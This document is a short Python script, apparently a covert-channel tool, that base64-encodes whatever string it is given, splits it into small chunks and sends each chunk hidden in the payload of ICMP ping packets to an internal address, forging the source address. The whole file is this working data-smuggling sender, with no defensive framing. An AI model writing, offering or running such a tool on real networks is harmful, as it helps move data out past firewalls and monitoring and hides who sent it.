#!/usr/bin/env python
from scapy.all import *
from base64 import b64encode
import sys

input = sys.argv[1]
input = b64encode(input)
data = [input[0:10]]

if ( len(input) > 10 ):
	index = 10
	for i in range((len(input) / 10) + 1):
		cut = input[index:index+10]
		index += 10
		if cut != ' ':
			data.append(cut)
for segment in data:
	if segment:
		print "[+] Sending ICMP with data %s " % segment
		ping = IP(src="1.2.3.4",dst="10.1.0.3")/ICMP()/segment
		send(ping, verbose=0)
